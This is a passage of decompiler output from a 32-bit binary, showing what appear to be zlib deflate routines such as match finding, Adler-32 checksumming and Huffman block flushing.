    v8 = v6 + v2;
    if ( !v5 && v7 < v8
      || ((a1[25] = v8, a1[27] = v7 - v8, v6 < 0) ? (v9 = 0) : (v9 = (_BYTE *)(v6 + a1[12])),
          sub_406640((int)a1, v9, v2, 0),
          v17 = *a1,
          a1[21] = a1[25],
          sub_4057A0(v17),
          *(_DWORD *)(*a1 + 16)) )
    {
      v10 = a1[21];
      v11 = a1[25] - v10;
      if ( v11 < a1[9] - 262 )
        continue;
      v12 = v10 < 0 ? 0 : (_BYTE *)(v10 + a1[12]);
      sub_406640((int)a1, v12, v11, 0);
      v18 = *a1;
      a1[21] = a1[25];
      sub_4057A0(v18);
      if ( *(_DWORD *)(*a1 + 16) )
        continue;
    }
    return 0;
  }
  if ( !a2 )
    return 0;
  v13 = a1[21];
  if ( v13 < 0 )
    v14 = 0;
  else
    v14 = (_BYTE *)(v13 + a1[12]);
  sub_406640((int)a1, v14, a1[25] - v13, a2 == 4);
  v19 = *a1;
  a1[21] = a1[25];
  sub_4057A0(v19);
  if ( !*(_DWORD *)(*a1 + 16) )
    return a2 != 4 ? 0 : 2;
  v16 = -(a2 != 4);
  LOBYTE(v16) = v16 & 0xFE;
  return v16 + 3;
}
// 40585E: conditional instruction was optimized away because eax.4==0

//----- (00405980) --------------------------------------------------------
int __cdecl sub_405980(int a1)
{
  unsigned int v1; // ebp
  unsigned int v2; // eax
  int v3; // ecx
  unsigned int v4; // edx
  int v5; // eax
  unsigned int v6; // ecx
  int v7; // esi
  int v8; // ecx
  _WORD *v9; // ecx
  __int16 v10; // ax
  unsigned int v11; // esi
  _WORD *v12; // ecx
  __int16 v13; // ax
  int result; // eax
  unsigned int v15; // esi
  int v16; // ecx
  unsigned __int8 *v17; // edi
  int v18; // eax

  v1 = *(_DWORD *)(a1 + 36);
  do
  {
    v2 = *(_DWORD *)(a1 + 100);
    v3 = *(_DWORD *)(a1 + 108);
    v4 = *(_DWORD *)(a1 + 52) - v2 - v3;
    if ( v4 )
    {
      if ( v4 == -1 )
      {
        v4 = -2;
        goto LABEL_20;
      }
    }
    else if ( !v2 && !v3 )
    {
      v4 = v1;
      goto LABEL_20;
    }
    if ( v2 >= *(_DWORD *)(a1 + 36) + v1 - 262 )
    {
      qmemcpy(*(void **)(a1 + 48), (const void *)(*(_DWORD *)(a1 + 48) + v1), v1);
      v5 = *(_DWORD *)(a1 + 84);
      v6 = *(_DWORD *)(a1 + 100) - v1;
      *(_DWORD *)(a1 + 104) -= v1;
      v7 = *(_DWORD *)(a1 + 68);
      *(_DWORD *)(a1 + 100) = v6;
      v8 = *(_DWORD *)(a1 + 60);
      *(_DWORD *)(a1 + 84) = v5 - v1;
      v9 = (_WORD *)(v8 + 2 * v7);
      do
      {
        if ( (unsigned __int16)*--v9 < v1 )
          v10 = 0;
        else
          v10 = *v9 - v1;
        --v7;
        *v9 = v10;
      }
      while ( v7 );
      v11 = v1;
      v12 = (_WORD *)(*(_DWORD *)(a1 + 56) + 2 * v1);
      do
      {
        if ( (unsigned __int16)*--v12 < v1 )
          v13 = 0;
        else
          v13 = *v12 - v1;
        --v11;
        *v12 = v13;
      }
      while ( v11 );
      v4 += v1;
    }
LABEL_20:
    result = *(_DWORD *)a1;
    if ( !*(_DWORD *)(*(_DWORD *)a1 + 4) )
      break;
    result = sub_405AB0(result, (void *)(*(_DWORD *)(a1 + 48) + *(_DWORD *)(a1 + 100) + *(_DWORD *)(a1 + 108)), v4);
    v15 = result + *(_DWORD *)(a1 + 108);
    *(_DWORD *)(a1 + 108) = v15;
    if ( v15 >= 3 )
    {
      v16 = *(_DWORD *)(a1 + 80);
      v17 = (unsigned __int8 *)(*(_DWORD *)(a1 + 100) + *(_DWORD *)(a1 + 48));
      v18 = *v17;
      *(_DWORD *)(a1 + 64) = v18;
      result = *(_DWORD *)(a1 + 76) & (v17[1] ^ (v18 << v16));
      *(_DWORD *)(a1 + 64) = result;
    }
    if ( v15 >= 0x106 )
      break;
    result = *(_DWORD *)(*(_DWORD *)a1 + 4);
  }
  while ( result );
  return result;
}

//----- (00405AB0) --------------------------------------------------------
unsigned int __cdecl sub_405AB0(int a1, void *a2, unsigned int a3)
{
  unsigned int v3; // ebx
  int v5; // eax

  v3 = *(_DWORD *)(a1 + 4);
  if ( v3 > a3 )
    v3 = a3;
  if ( !v3 )
    return 0;
  *(_DWORD *)(a1 + 4) -= v3;
  if ( !*(_DWORD *)(*(_DWORD *)(a1 + 28) + 24) )
    *(_DWORD *)(a1 + 48) = sub_406400(*(_DWORD *)(a1 + 48), *(unsigned __int8 **)a1, v3);
  qmemcpy(a2, *(const void **)a1, v3);
  v5 = *(_DWORD *)(a1 + 8);
  *(_DWORD *)a1 += v3;
  *(_DWORD *)(a1 + 8) = v3 + v5;
  return v3;
}

//----- (00405B30) --------------------------------------------------------
int __cdecl sub_405B30(int a1, int a2)
{
  int v2; // edi
  unsigned int v3; // eax
  int v4; // edx
  int v5; // ecx
  int v6; // eax
  char v7; // cl
  __int16 v8; // ax
  unsigned __int16 v9; // ax
  int v10; // edx
  int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // edx
  BOOL v14; // ebp
  unsigned int v15; // ecx
  int v16; // eax
  int v17; // edi
  int v18; // edx
  int v19; // ecx
  int v20; // eax
  int v21; // eax
  unsigned int v22; // ecx
  unsigned __int8 *v23; // edx
  int v24; // ecx
  int v25; // eax
  unsigned __int8 v26; // al
  int v27; // ecx
  _BYTE *v28; // eax
  int v29; // ecx
  _BYTE *v30; // eax
  int v32; // eax
  int v33; // [esp-14h] [ebp-24h]
  int v34; // [esp-14h] [ebp-24h]

  v2 = 0;
  while ( 1 )
  {
    v3 = *(_DWORD *)(a1 + 108);
    if ( v3 < 0x106 )
    {
      sub_405980(a1);
      v3 = *(_DWORD *)(a1 + 108);
      if ( v3 < 0x106 && !a2 )
        return 0;
      if ( !v3 )
        break;
    }
    if ( v3 >= 3 )
    {
      v4 = *(_DWORD *)(a1 + 100);
      v5 = *(_DWORD *)(a1 + 60);
      v6 = *(_DWORD *)(a1 + 76) & (*(unsigned __int8 *)(*(_DWORD *)(a1 + 48) + v4 + 2) ^ (*(_DWORD *)(a1 + 64) << *(_DWORD *)(a1 + 80)));
      HIWORD(v2) = 0;
      *(_DWORD *)(a1 + 64) = v6;
      LOWORD(v2) = *(_WORD *)(v5 + 2 * v6);
      *(_WORD *)(*(_DWORD *)(a1 + 56) + 2 * (v4 & *(_DWORD *)(a1 + 44))) = v2;
      *(_WORD *)(*(_DWORD *)(a1 + 60) + 2 * *(_DWORD *)(a1 + 64)) = *(_WORD *)(a1 + 100);
    }
    if ( v2 && *(_DWORD *)(a1 + 100) - v2 <= (unsigned int)(*(_DWORD *)(a1 + 36) - 262) && *(_DWORD *)(a1 + 128) != 2 )
      *(_DWORD *)(a1 + 88) = sub_405E60((_DWORD *)a1, v2);
    if ( *(_DWORD *)(a1 + 88) < 3u )
    {
      v26 = *(_BYTE *)(*(_DWORD *)(a1 + 100) + *(_DWORD *)(a1 + 48));
      *(_WORD *)(*(_DWORD *)(a1 + 5788) + 2 * *(_DWORD *)(a1 + 5784)) = 0;
      *(_BYTE *)(*(_DWORD *)(a1 + 5776) + (*(_DWORD *)(a1 + 5784))++) = v26;
      ++*(_WORD *)(a1 + 4 * v26 + 140);
      v14 = *(_DWORD *)(a1 + 5784) == *(_DWORD *)(a1 + 5780) - 1;
      --*(_DWORD *)(a1 + 108);
    }
    else
    {
      v7 = *(_DWORD *)(a1 + 88);
      v8 = *(_WORD *)(a1 + 100) - *(_WORD *)(a1 + 104);
      *(_WORD *)(*(_DWORD *)(a1 + 5788) + 2 * *(_DWORD *)(a1 + 5784)) = v8;
      v9 = v8 - 1;
      *(_BYTE *)(*(_DWORD *)(a1 + 5776) + (*(_DWORD *)(a1 + 5784))++) = v7 - 3;
      v10 = (unsigned __int8)byte_41FDF0[(unsigned __int8)(v7 - 3)];
      ++*(_WORD *)(a1 + 4 * v10 + 1168);
      if ( v9 >= 0x100u )
        v11 = (unsigned __int8)byte_41FCF0[v9 >> 7];
      else
        v11 = (unsigned __int8)byte_41FBF0[v9];
      ++*(_WORD *)(a1 + 4 * v11 + 2432);
      v12 = *(_DWORD *)(a1 + 88);
      v13 = *(_DWORD *)(a1 + 120);
      v14 = *(_DWORD *)(a1 + 5784) == *(_DWORD *)(a1 + 5780) - 1;
      v15 = *(_DWORD *)(a1 + 108) - v12;
      *(_DWORD *)(a1 + 108) = v15;
      if ( v12 > v13 || v15 < 3 )
      {
        v22 = v12 + *(_DWORD *)(a1 + 100);
        v23 = (unsigned __int8 *)(v22 + *(_DWORD *)(a1 + 48));
        *(_DWORD *)(a1 + 100) = v22;
        v24 = *(_DWORD *)(a1 + 80);
        *(_DWORD *)(a1 + 88) = 0;
        v25 = *v23;
        *(_DWORD *)(a1 + 64) = v25;
        *(_DWORD *)(a1 + 64) = *(_DWORD *)(a1 + 76) & (v23[1] ^ (v25 << v24));
        goto LABEL_24;
      }
      *(_DWORD *)(a1 + 88) = v12 - 1;
      do
      {
        v16 = *(_DWORD *)(a1 + 48);
        v17 = *(_DWORD *)(a1 + 64);
        v18 = *(_DWORD *)(a1 + 100) + 1;
        *(_DWORD *)(a1 + 100) = v18;
        v19 = *(_DWORD *)(a1 + 60);
        v20 = *(_DWORD *)(a1 + 76) & ((v17 << *(_DWORD *)(a1 + 80)) ^ *(unsigned __int8 *)(v18 + v16 + 2));
        HIWORD(v2) = 0;
        *(_DWORD *)(a1 + 64) = v20;
        LOWORD(v2) = *(_WORD *)(v19 + 2 * v20);
        *(_WORD *)(*(_DWORD *)(a1 + 56) + 2 * (*(_DWORD *)(a1 + 44) & v18)) = v2;
        *(_WORD *)(*(_DWORD *)(a1 + 60) + 2 * *(_DWORD *)(a1 + 64)) = *(_WORD *)(a1 + 100);
        v21 = *(_DWORD *)(a1 + 88) - 1;
        *(_DWORD *)(a1 + 88) = v21;
      }
      while ( v21 );
    }
    ++*(_DWORD *)(a1 + 100);
LABEL_24:
    if ( v14 )
    {
      v27 = *(_DWORD *)(a1 + 84);
      v28 = v27 < 0 ? 0 : (_BYTE *)(*(_DWORD *)(a1 + 48) + v27);
      sub_406640(a1, v28, *(_DWORD *)(a1 + 100) - v27, 0);
      v33 = *(_DWORD *)a1;
      *(_DWORD *)(a1 + 84) = *(_DWORD *)(a1 + 100);
      sub_4057A0(v33);
      if ( !*(_DWORD *)(*(_DWORD *)a1 + 16) )
        return 0;
    }
  }
  v29 = *(_DWORD *)(a1 + 84);
  if ( v29 < 0 )
    v30 = 0;
  else
    v30 = (_BYTE *)(v29 + *(_DWORD *)(a1 + 48));
  sub_406640(a1, v30, *(_DWORD *)(a1 + 100) - v29, a2 == 4);
  v34 = *(_DWORD *)a1;
  *(_DWORD *)(a1 + 84) = *(_DWORD *)(a1 + 100);
  sub_4057A0(v34);
  if ( !*(_DWORD *)(*(_DWORD *)a1 + 16) )
    return a2 != 4 ? 0 : 2;
  v32 = -(a2 != 4);
  LOBYTE(v32) = v32 & 0xFE;
  return v32 + 3;
}

//----- (00405E60) --------------------------------------------------------
unsigned int __cdecl sub_405E60(_DWORD *a1, int a2)
{
  int v3; // esi
  unsigned int v4; // edx
  unsigned int v5; // ebp
  unsigned int v6; // eax
  _BYTE *v7; // ecx
  _BYTE *v8; // ebx
  _BYTE *v10; // edx
  char v11; // al
  _BYTE *v12; // edx
  _BYTE *v13; // ecx
  _BYTE *v14; // edx
  char v15; // al
  _BYTE *v16; // edx
  char v17; // al
  _BYTE *v18; // edx
  char v19; // al
  _BYTE *v20; // edx
  char v21; // al
  _BYTE *v22; // edx
  char v23; // al
  _BYTE *v24; // edx
  char v25; // al
  _BYTE *v26; // edx
  char v27; // al
  _BYTE *v28; // edx
  char v29; // al
  _BYTE *v30; // edx
  int v31; // edx
  unsigned int result; // eax
  char v33; // [esp+13h] [ebp-11h]
  unsigned int v34; // [esp+14h] [ebp-10h]
  int v35; // [esp+18h] [ebp-Ch]
  unsigned int v36; // [esp+1Ch] [ebp-8h]
  unsigned int v37; // [esp+20h] [ebp-4h]
  char v38; // [esp+28h] [ebp+4h]

  v3 = a1[9];
  v4 = a1[25];
  v5 = a1[28];
  v34 = a1[29];
  v6 = a1[34];
  v7 = (_BYTE *)(v4 + a1[12]);
  v35 = v6;
  if ( v4 <= v3 - 262 )
    v36 = 0;
  else
    v36 = v4 - v3 + 262;
  v8 = v7 + 258;
  v38 = v7[v5 - 1];
  v33 = v7[v5];
  if ( v5 >= a1[33] )
    v34 >>= 2;
  v37 = a1[27];
  if ( v6 > v37 )
    v35 = a1[27];
  do
  {
    v10 = (_BYTE *)(a2 + a1[12]);
    if ( v10[v5] == v33 && v10[v5 - 1] == v38 && *v10 == *v7 )
    {
      v11 = v10[1];
      v12 = v10 + 1;
      if ( v11 == v7[1] )
      {
        v13 = v7 + 2;
        v14 = v12 + 1;
        do
        {
          v15 = *++v13;
          v16 = v14 + 1;
          if ( v15 != *v16 )
            break;
          v17 = *++v13;
          v18 = v16 + 1;
          if ( v17 != *v18 )
            break;
          v19 = *++v13;
          v20 = v18 + 1;
          if ( v19 != *v20 )
            break;
          v21 = *++v13;
          v22 = v20 + 1;
          if ( v21 != *v22 )
            break;
          v23 = *++v13;
          v24 = v22 + 1;
          if ( v23 != *v24 )
            break;
          v25 = *++v13;
          v26 = v24 + 1;
          if ( v25 != *v26 )
            break;
          v27 = *++v13;
          v28 = v26 + 1;
          if ( v27 != *v28 )
            break;
          v29 = *++v13;
          v14 = v28 + 1;
          if ( v29 != *v14 )
            break;
        }
        while ( v13 < v8 );
        v30 = v13;
        v7 = v8 - 258;
        v31 = v30 - v8 + 258;
        if ( v31 > (int)v5 )
        {
          a1[26] = a2;
          v5 = v31;
          if ( v31 >= v35 )
            break;
          v38 = v7[v31 - 1];
          v33 = v7[v31];
        }
      }
    }
    a2 = *(unsigned __int16 *)(a1[14] + 2 * (a2 & a1[11]));
    if ( (unsigned __int16)a2 <= v36 )
      break;
    --v34;
  }
  while ( v34 );
  result = v37;
  if ( v5 <= v37 )
    return v5;
  return result;
}

//----- (00405FD0) --------------------------------------------------------
int __cdecl sub_405FD0(_DWORD *a1, int a2)
{
  int v3; // edi
  unsigned int v4; // eax
  int v6; // edx
  int v7; // ecx
  int v8; // eax
  unsigned int v9; // edx
  int v10; // eax
  unsigned int v11; // eax
  unsigned int v12; // eax
  unsigned int v13; // ebp
  __int16 v14; // ax
  unsigned __int16 v15; // ax
  int v16; // eax
  int v17; // eax
  BOOL v18; // ebx
  unsigned int v19; // edx
  int v20; // ecx
  int v21; // eax
  int v22; // eax
  int v23; // ecx
  int v24; // edx
  _BYTE *v25; // eax
  unsigned __int8 v26; // al
  int v27; // ecx
  _BYTE *v28; // eax
  int v29; // ecx
  int v30; // edx
  int v31; // ecx
  int v32; // eax
  int v33; // ecx
  _BYTE *v34; // eax
  int v36; // eax
  int v37; // [esp-14h] [ebp-28h]
  int v38; // [esp-14h] [ebp-28h]
  int v39; // [esp-14h] [ebp-28h]
  unsigned __int8 v40; // [esp+18h] [ebp+4h]
  unsigned __int8 v41; // [esp+1Ch] [ebp+8h]

  v3 = 0;
  while ( 1 )
  {
    v4 = a1[27];
    if ( v4 < 0x106 )
    {
      sub_405980((int)a1);
      v4 = a1[27];
      if ( v4 < 0x106 && !a2 )
        return 0;
      if ( !v4 )
        break;
    }
    if ( v4 >= 3 )
    {
      v6 = a1[25];
      v7 = a1[15];
      v8 = a1[19] & (*(unsigned __int8 *)(a1[12] + v6 + 2) ^ (a1[16] << a1[20]));
      HIWORD(v3) = 0;
      a1[16] = v8;
      LOWORD(v3) = *(_WORD *)(v7 + 2 * v8);
      *(_WORD *)(a1[14] + 2 * (v6 & a1[11])) = v3;
      *(_WORD *)(a1[15] + 2 * a1[16]) = *((_WORD *)a1 + 50);
    }
    v9 = a1[22];
    v10 = a1[26];
    a1[28] = v9;
    a1[23] = v10;
    a1[22] = 2;
    if ( v3 && v9 < a1[30] && a1[25] - v3 <= (unsigned int)(a1[9] - 262) )
    {
      if ( a1[32] != 2 )
        a1[22] = sub_405E60(a1, v3);
      v11 = a1[22];
      if ( v11 <= 5 && (a1[32] == 1 || v11 == 3 && (unsigned int)(a1[25] - a1[26]) > 0x1000) )
        a1[22] = 2;
    }
    v12 = a1[28];
    if ( v12 < 3 || a1[22] > v12 )
    {
      if ( a1[24] )
      {
        v26 = *(_BYTE *)(a1[25] + a1[12] - 1);
        *(_WORD *)(a1[1447] + 2 * a1[1446]) = 0;
        *(_BYTE *)(a1[1444] + a1[1446]++) = v26;
        ++LOWORD(a1[v26 + 35]);
        if ( a1[1446] == a1[1445] - 1 )
        {
          v27 = a1[21];
          if ( v27 < 0 )
            v28 = 0;
          else
            v28 = (_BYTE *)(a1[12] + v27);
          sub_406640((int)a1, v28, a1[25] - v27, 0);
          v38 = *a1;
          a1[21] = a1[25];
          sub_4057A0(v38);
        }
        v29 = a1[27] - 1;
        ++a1[25];
        v30 = *a1;
        a1[27] = v29;
        if ( !*(_DWORD *)(v30 + 16) )
          return 0;
      }
      else
      {
        v31 = a1[25] + 1;
        v32 = a1[27] - 1;
        a1[24] = 1;
        a1[25] = v31;
        a1[27] = v32;
      }
    }
    else
    {
      v13 = a1[25] + a1[27] - 3;
      v14 = a1[25] - *((_WORD *)a1 + 46) - 1;
      v40 = *((_BYTE *)a1 + 112) - 3;
      *(_WORD *)(a1[1447] + 2 * a1[1446]) = v14;
      v15 = v14 - 1;
      *(_BYTE *)(a1[1444] + a1[1446]++) = v40;
      ++LOWORD(a1[(unsigned __int8)byte_41FDF0[v40] + 292]);
      if ( v15 >= 0x100u )
        v16 = (unsigned __int8)byte_41FCF0[v15 >> 7];
      else
        v16 = (unsigned __int8)byte_41FBF0[v15];
      ++LOWORD(a1[v16 + 608]);
      v17 = a1[28];
      v18 = a1[1446] == a1[1445] - 1;
      a1[27] += 1 - v17;
      a1[28] = v17 - 2;
      do
      {
        v19 = a1[25] + 1;
        a1[25] = v19;
        if ( v19 <= v13 )
        {
          v20 = a1[15];
          v21 = a1[19] & (*(unsigned __int8 *)(a1[12] + v19 + 2) ^ (a1[16] << a1[20]));
          HIWORD(v3) = 0;
          a1[16] = v21;
          LOWORD(v3) = *(_WORD *)(v20 + 2 * v21);
          *(_WORD *)(a1[14] + 2 * (v19 & a1[11])) = v3;
          *(_WORD *)(a1[15] + 2 * a1[16]) = *((_WORD *)a1 + 50);
        }
        v22 = a1[28] - 1;
        a1[28] = v22;
      }
      while ( v22 );
      v23 = a1[25] + 1;
      a1[24] = 0;
      a1[22] = 2;
      a1[25] = v23;
      if ( v18 )
      {
        v24 = a1[21];
        v25 = v24 < 0 ? 0 : (_BYTE *)(v24 + a1[12]);
        sub_406640((int)a1, v25, v23 - v24, 0);
        v37 = *a1;
        a1[21] = a1[25];
        sub_4057A0(v37);
        if ( !*(_DWORD *)(*a1 + 16) )
          return 0;
      }
    }
  }
  if ( a1[24] )
  {
    v41 = *(_BYTE *)(a1[25] + a1[12] - 1);
    *(_WORD *)(a1[1447] + 2 * a1[1446]) = 0;
    *(_BYTE *)(a1[1444] + a1[1446]++) = v41;
    ++LOWORD(a1[v41 + 35]);
    a1[24] = 0;
  }
  v33 = a1[21];
  if ( v33 < 0 )
    v34 = 0;
  else
    v34 = (_BYTE *)(v33 + a1[12]);
  sub_406640((int)a1, v34, a1[25] - v33, a2 == 4);
  v39 = *a1;
  a1[21] = a1[25];
  sub_4057A0(v39);
  if ( !*(_DWORD *)(*a1 + 16) )
    return a2 != 4 ? 0 : 2;
  v36 = -(a2 != 4);
  LOBYTE(v36) = v36 & 0xFE;
  return v36 + 3;
}

//----- (00406400) --------------------------------------------------------
int __cdecl sub_406400(unsigned int a1, unsigned __int8 *a2, unsigned int a3)
{
  unsigned __int8 *v3; // esi
  unsigned int v4; // ecx
  unsigned int v5; // edi
  unsigned int i; // ebx
  int v8; // eax
  unsigned int v9; // ebp
  int v10; // edx
  int v11; // ecx
  int v12; // edi
  int v13; // ecx
  int v14; // edi
  int v15; // ecx
  int v16; // edi
  int v17; // ecx
  int v18; // edi
  int v19; // ecx
  int v20; // edi
  int v21; // ecx
  int v22; // edi
  int v23; // ecx
  int v24; // edi
  int v25; // ecx
  int v26; // edi
  int v27; // ecx
  int v28; // edi
  int v29; // ecx
  int v30; // edi
  int v31; // ecx
  int v32; // edi
  int v33; // ecx
  int v34; // edi
  int v35; // ecx
  int v36; // edi
  int v37; // ecx
  int v38; // edi
  int v39; // ecx
  int v40; // edi

  v3 = a2;
  v4 = (unsigned __int16)a1;
  v5 = HIWORD(a1);
  if ( !a2 )
    return 1;
  for ( i = a3; i; v5 %= 0xFFF1u )
  {
    v8 = i;
    if ( i >= 0x15B0 )
      v8 = 5552;
    i -= v8;
    if ( v8 >= 16 )
    {
      v9 = (unsigned int)v8 >> 4;
      v8 += -16 * ((unsigned int)v8 >> 4);
      do
      {
        v10 = *v3;
        v3 += 16;
        v11 = v10 + v4;
        v12 = v11 + v5;
        v13 = *(v3 - 15) + v11;
        v14 = v13 + v12;
        v15 = *(v3 - 14) + v13;
        v16 = v15 + v14;
        v17 = *(v3 - 13) + v15;
        v18 = v17 + v16;
        v19 = *(v3 - 12) + v17;
        v20 = v19 + v18;
        v21 = *(v3 - 11) + v19;
        v22 = v21 + v20;
        v23 = *(v3 - 10) + v21;
        v24 = v23 + v22;
        v25 = *(v3 - 9) + v23;
        v26 = v25 + v24;
        v27 = *(v3 - 8) + v25;
        v28 = v27 + v26;
        v29 = *(v3 - 7) + v27;
        v30 = v29 + v28;
        v31 = *(v3 - 6) + v29;
        v32 = v31 + v30;
        v33 = *(v3 - 5) + v31;
        v34 = v33 + v32;
        v35 = *(v3 - 4) + v33;
        v36 = v35 + v34;
        v37 = *(v3 - 3) + v35;
        v38 = v37 + v36;
        v39 = *(v3 - 2) + v37;
        v40 = v39 + v38;
        v4 = *(v3 - 1) + v39;
        v5 = v4 + v40;
        --v9;
      }
      while ( v9 );
    }
    for ( ; v8; --v8 )
    {
      v4 += *v3++;
      v5 += v4;
    }
    v4 %= 0xFFF1u;
  }
  return v4 | (v5 << 16);
}

//----- (00406530) --------------------------------------------------------
_WORD *__cdecl sub_406530(int a1)
{
  int v1; // ecx
  _WORD *v2; // eax
  _WORD *v3; // eax
  int v4; // ecx
  _WORD *result; // eax
  int v6; // ecx

  v1 = 286;
  v2 = (_WORD *)(a1 + 140);
  do
  {
    *v2 = 0;
    v2 += 2;
    --v1;
  }
  while ( v1 );
  v3 = (_WORD *)(a1 + 2432);
  v4 = 30;
  do
  {
    *v3 = 0;
    v3 += 2;
    --v4;
  }
  while ( v4 );
  result = (_WORD *)(a1 + 2676);
  v6 = 19;
  do
  {
    *result = 0;
    result += 2;
    --v6;
  }
  while ( v6 );
  *(_DWORD *)(a1 + 5796) = 0;
  *(_DWORD *)(a1 + 5792) = 0;
  *(_DWORD *)(a1 + 5800) = 0;
  *(_DWORD *)(a1 + 5784) = 0;
  *(_WORD *)(a1 + 1164) = 1;
  return result;
}

//----- (004065A0) --------------------------------------------------------
_BYTE *__cdecl sub_4065A0(int a1, _BYTE *a2, int a3, int a4)
{
  int v4; // ecx
  int v5; // esi
  int v6; // ecx
  int v7; // edi
  int v8; // esi
  int v9; // esi

  v4 = *(_DWORD *)(a1 + 5812);
  if ( v4 <= 13 )
  {
    *(_WORD *)(a1 + 5808) |= a4 << v4;
    *(_DWORD *)(a1 + 5812) = v4 + 3;
  }
  else
  {
    v5 = a4 << v4;
    v6 = *(_DWORD *)(a1 + 8);
    *(_WORD *)(a1 + 5808) |= v5;
    *(_BYTE *)(v6 + *(_DWORD *)(a1 + 20)) = *(_BYTE *)(a1 + 5808);
    v7 = *(_DWORD *)(a1 + 8);
    LOBYTE(v6) = *(_BYTE *)(a1 + 5809);
    v8 = *(_DWORD *)(a1 + 20) + 1;
    *(_DWORD *)(a1 + 20) = v8;
    *(_BYTE *)(v7 + v8) = v6;
    v9 = *(_DWORD *)(a1 + 5812);
    ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 5812) = v9 - 13;
    *(_WORD *)(a1 + 5808) = (unsigned __int16)a4 >> (16 - v9);
  }
  return sub_407CB0((_DWORD *)a1, a2, a3, 1);
}

//----- (00406640) --------------------------------------------------------
_WORD *__cdecl sub_406640(int a1, _BYTE *a2, int a3, int a4)
{
  int v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // ecx
  int v7; // edi
  bool v8; // zf
  int v9; // ecx
  int v10; // eax
  int v11; // edx
  int v12; // ecx
  int v13; // ebx
  int v14; // edx
  int v15; // edx
  int v16; // edx
  int v17; // ebp
  int v18; // ebp
  int v19; // ebx
  int v20; // ebx
  _WORD *result; // eax

  v4 = 0;
  if ( *(int *)(a1 + 124) <= 0 )
  {
    v6 = a3 + 5;
LABEL_7:
    v5 = v6;
    goto LABEL_8;
  }
  if ( *(_BYTE *)(a1 + 28) == 2 )
    sub_407B90(a1);
  sub_406830((_DWORD *)a1, (int *)(a1 + 2832));
  sub_406830((_DWORD *)a1, (int *)(a1 + 2844));
  v4 = sub_406E00(a1);
  v5 = (unsigned int)(*(_DWORD *)(a1 + 5792) + 10) >> 3;
  v6 = (unsigned int)(*(_DWORD *)(a1 + 5796) + 10) >> 3;
  if ( v6 <= v5 )
    goto LABEL_7;
LABEL_8:
  if ( a3 + 4 <= v5 && a2 )
  {
    v7 = a4;
    sub_4065A0(a1, a2, a3, a4);
  }
  else
  {
    v8 = v6 == v5;
    v9 = *(_DWORD *)(a1 + 5812);
    if ( v8 )
    {
      v7 = a4;
      v10 = a4 + 2;
      if ( v9 <= 13 )
      {
        *(_WORD *)(a1 + 5808) |= v10 << v9;
        *(_DWORD *)(a1 + 5812) = v9 + 3;
      }
      else
      {
        v11 = v10 << v9;
        v12 = *(_DWORD *)(a1 + 8);
        *(_WORD *)(a1 + 5808) |= v11;
        *(_BYTE *)(v12 + *(_DWORD *)(a1 + 20)) = *(_BYTE *)(a1 + 5808);
        v13 = *(_DWORD *)(a1 + 8);
        v14 = *(_DWORD *)(a1 + 20) + 1;
        *(_DWORD *)(a1 + 20) = v14;
        *(_BYTE *)(v13 + v14) = *(_BYTE *)(a1 + 5809);
        v15 = *(_DWORD *)(a1 + 5812);
        ++*(_DWORD *)(a1 + 20);
        *(_DWORD *)(a1 + 5812) = v15 - 13;
        *(_WORD *)(a1 + 5808) = (unsigned __int16)v10 >> (16 - v15);
      }
      sub_407750(a1, (int)&unk_41F6F8, (int)&unk_41FB78);
    }
    else
    {
      v7 = a4;
      v16 = a4 + 4;
      if ( v9 <= 13 )
      {
        *(_WORD *)(a1 + 5808) |= v16 << v9;
        *(_DWORD *)(a1 + 5812) = v9 + 3;
      }
      else
      {
        v17 = *(_DWORD *)(a1 + 8);
        *(_WORD *)(a1 + 5808) |= v16 << v9;
        *(_BYTE *)(*(_DWORD *)(a1 + 20) + v17) = *(_BYTE *)(a1 + 5808);
        v18 = *(_DWORD *)(a1 + 8);
        v19 = *(_DWORD *)(a1 + 20) + 1;
        *(_DWORD *)(a1 + 20) = v19;
        *(_BYTE *)(v19 + v18) = *(_BYTE *)(a1 + 5809);
        v20 = *(_DWORD *)(a1 + 5812);
        ++*(_DWORD *)(a1 + 20);
        *(_DWORD *)(a1 + 5812) = v20 - 13;
        *(_WORD *)(a1 + 5808) = (unsigned __int16)v16 >> (16 - v20);
      }
      sub_406F60(a1, *(_DWORD *)(a1 + 2836) + 1, *(_DWORD *)(a1 + 2848) + 1, v4 + 1);
      sub_407750(a1, a1 + 140, a1 + 2432);
    }
  }
  result = sub_406530(a1);
  if ( v7 )
    return (_WORD *)sub_407C30(a1);
  return result;
}

//----- (00406830) --------------------------------------------------------
unsigned int __cdecl sub_406830(_DWORD *a1, int *a2)
{
  _WORD *v3; // edi
  int *v4; // eax
  int v5; // ebp
  int v6; // ebx
  int v7; // ecx
  int v8; // eax
  _WORD *v9; // edx
  int v10; // ecx
  int v11; // ecx
  int v12; // eax
  int v13; // ecx
  int i; // ebx
  int v15; // eax
  int v16; // ebx
  int v17; // ebp
  int v18; // edx
  int v19; // ecx
  char v20; // al
  int v21; // ecx
  int v22; // edx
  int v24; // [esp+10h] [ebp-8h]
  int v25; // [esp+14h] [ebp-4h]
  _WORD *v26; // [esp+1Ch] [ebp+4h]

  v3 = (_WORD *)*a2;
  v4 = (int *)a2[2];
  v5 = -1;
  v6 = *v4;
  v7 = v4[3];
  v8 = 0;
  v25 = v7;
  v24 = -1;
  a1[1298] = 0;
  a1[1299] = 573;
  if ( v7 > 0 )
  {
    v9 = v3;
    do
    {
      if ( *v9 )
      {
        v24 = v8;
        v10 = a1[1298] + 1;
        v5 = v8;
        a1[1298] = v10;
        a1[v10 + 725] = v8;
        *((_BYTE *)a1 + v8 + 5200) = 0;
      }
      else
      {
        v9[1] = 0;
      }
      ++v8;
      v9 += 2;
    }
    while ( v8 < v25 );
  }
  v11 = a1[1298];
  if ( v11 < 2 )
  {
    do
    {
      if ( v5 >= 2 )
        v12 = 0;
      else
        v12 = ++v5;
      v13 = v11 + 1;
      a1[1298] = v13;
      a1[v13 + 725] = v12;
      v3[2 * v12] = 1;
      *((_BYTE *)a1 + v12 + 5200) = 0;
      --a1[1448];
      if ( v6 )
        a1[1449] -= *(unsigned __int16 *)(v6 + 4 * v12 + 2);
      v11 = a1[1298];
    }
    while ( v11 < 2 );
    v24 = v5;
  }
  a2[1] = v5;
  for ( i = a1[1298] / 2; i >= 1; --i )
    sub_406A70((int)a1, (int)v3, i);
  v26 = &v3[2 * v25];
  do
  {
    v15 = a1[1298];
    v16 = a1[726];
    a1[726] = a1[v15 + 725];
